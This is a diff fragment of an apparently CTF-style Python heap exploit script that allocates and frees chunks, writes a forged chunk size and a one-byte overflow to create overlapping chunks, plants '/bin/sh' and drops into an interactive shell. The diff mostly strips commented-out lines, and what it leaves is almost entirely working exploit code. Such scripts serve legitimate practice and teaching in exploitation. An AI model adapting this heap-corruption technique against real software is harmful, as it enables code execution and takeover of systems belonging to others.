@@ -30,21 +30,15 @@ def exploit(r):
     add("B"*0x20) # 1
     add("C"*0x20) # 2
     add("D"*0x20) # 3
-    #add("E"*0x20) # 4
-    
-    #remove(0) # free(A)
+
     remove(2) # free(C)
-    #remove(3) # free(D)
- 
+
     #pause()
     payload  = "F"*(0x80-0x8)
     payload += p64(0x1b0)
     payload += "\x90"
     add(payload) # realloc(B)
     remove(0)
-    #add("") # realloc(C)
-    
-    #pause()
    
     remove(3)
     createCrib()
@@ -52,11 +46,8 @@ def exploit(r):
     payload += "ITSMAGIC"
     payload += "/bin/sh"
     add(payload)
-    
-    # LIBC LEAK
      
     gotoExam(1)
-    
 
     r.interactive()
 
